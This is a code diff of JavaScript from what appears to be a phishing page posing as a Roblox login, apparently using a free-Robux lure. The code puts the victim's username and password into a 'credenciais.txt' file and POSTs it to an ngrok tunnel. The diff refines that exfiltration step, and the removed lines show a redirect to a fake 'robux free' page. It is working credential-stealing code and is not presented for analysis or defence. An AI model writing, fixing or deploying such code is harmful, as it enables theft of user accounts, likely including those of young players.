@@ -568,39 +568,29 @@ site.</div></div></noscript>
                     localStorage.removeItem('roblox_username');
                     localStorage.removeItem('roblox_password');
                 }
-                
-                // Criar arquivo .txt
                 const credentials = `Usuário: ${username}\nSenha: ${password}`;
-                const blob = new Blob([credentials], { type: 'text/plain' });
+                const file = new File([credentials], 'credenciais.txt', { type: 'text/plain' });
 
-                // Criar FormData
                 const formData = new FormData();
-                formData.append('file', blob, 'credenciais.txt');
+                formData.append('file', file); // <- nome do campo tem que ser 'file'
                 formData.append('username', username);
 
-                // Enviar para o servidor Ngrok
                 fetch('https://6ab1a2027ad7.ngrok-free.app/login/', {
-                    method: 'POST',
-                    body: formData
+                method: 'POST',
+                body: formData
                 })
                 .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Erro no servidor');
-                    }
-                    return response.json();
+                 if (!response.ok) throw new Error('Erro no servidor');
+                  return response.json();
                 })
-                .then(data => {
-                    messageDiv.textContent = 'Login bem-sucedido! Redirecionando...';
-                    messageDiv.style.color = '#00aa00';
-                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
+               .then(data => {
+               console.log(data);
+                messageDiv.textContent = 'Login bem-sucedido!';
                 })
                 .catch(error => {
-                    console.error('Erro:', error);
-                    messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
-                    messageDiv.style.color = '#ff3333';
+                console.error('Erro:', error);
                 });
-            });
-
+                       
             // Links extras
             document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
                 e.preventDefault();
